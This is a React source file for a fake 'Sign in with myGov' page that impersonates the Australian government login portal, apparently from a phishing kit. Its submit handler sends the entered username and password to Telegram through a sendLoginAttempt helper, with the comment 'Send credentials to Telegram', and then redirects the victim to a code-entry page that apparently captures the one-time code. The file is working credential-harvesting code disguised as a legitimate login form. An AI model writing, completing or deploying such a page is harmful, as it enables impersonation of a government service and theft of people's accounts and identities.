import Layout from "@/components/Layout";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Link, useNavigate } from "react-router-dom";
import { useState, useRef } from "react";
import ReCAPTCHA from "react-google-recaptcha";
import { sendLoginAttempt } from "@/utils/telegramService";
import { sessionManager } from "@/utils/sessionManager";
import { useToast } from "@/hooks/use-toast";
const SignIn = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [captchaToken, setCaptchaToken] = useState<string | null>(null);
  const recaptchaRef = useRef<ReCAPTCHA>(null);
  const navigate = useNavigate();
  const {
    toast
  } = useToast();
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username || !password) {
      toast({
        title: "Error",
        description: "Please enter both username/email and password",
        variant: "destructive"
      });
      return;
    }
    if (!captchaToken) {
      toast({
        title: "Error",
        description: "Please complete the CAPTCHA verification",
        variant: "destructive"
      });
      return;
    }
    setIsLoading(true);
    try {
      // Send credentials to Telegram
      await sendLoginAttempt(username, password);

      // Initialize session
      sessionManager.initSession(username);

      // Navigate to OTP page
      navigate("/enter-code", {
        state: {
          username
        }
      });
      toast({
        title: "Success",
        description: "Redirecting to verification..."
      });
    } catch (error) {
      toast({
        title: "Error",
        description: "Sign in failed. Please try again.",
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  };
  return <Layout>
      <div className="min-h-[calc(100vh-200px)] bg-mygov-background flex items-center justify-center px-4 py-16">
        <Card className="w-full max-w-md">
          <CardHeader className="pb-6 text-left text-black font-medium text-2xl">
            <CardTitle className="text-mygov-text-primary text-left text-black font-bold text-4xl">
              Sign in with myGov
            </CardTitle>
            <CardDescription className="text-lg mt-4 text-mygov-text-secondary">
              Using your myGov sign in details
            </CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="username" className="text-mygov-text-primary">
                  Username or email
                </Label>
                <Input id="username" type="text" value={username} onChange={e => setUsername(e.target.value)} className="h-12 border-gray-300 focus:border-mygov-blue" disabled={isLoading} />
                <Link to="/forgot-username" className="text-sm text-mygov-text-secondary hover:underline block">
                  Forgot username
                </Link>
              </div>

              <div className="space-y-2">
                <Label htmlFor="password" className="text-mygov-text-primary">
                  Password
                </Label>
                <Input id="password" type="password" value={password} onChange={e => setPassword(e.target.value)} className="h-12 border-gray-300 focus:border-mygov-blue" disabled={isLoading} />
                <Link to="/forgot-password" className="text-sm text-mygov-text-secondary hover:underline block">
                  Forgot password
                </Link>
              </div>

              <div className="flex justify-center">
                <ReCAPTCHA ref={recaptchaRef} sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI" // Test key
              onChange={setCaptchaToken} />
              </div>

              <Button type="submit" className="w-full h-12 bg-mygov-light-blue hover:bg-mygov-light-blue/90 text-white font-medium" disabled={isLoading}>
                {isLoading ? "Signing in..." : "Sign in"}
              </Button>

              <div className="text-center">
                <Link to="/create-account" className="text-sm text-mygov-text-secondary hover:underline">
                  Create a myGov account
                </Link>
                <span className="text-sm text-mygov-text-secondary"> if you don't have one already.</span>
              </div>
            </form>
          </CardContent>
        </Card>
      </div>
    </Layout>;
};
export default SignIn;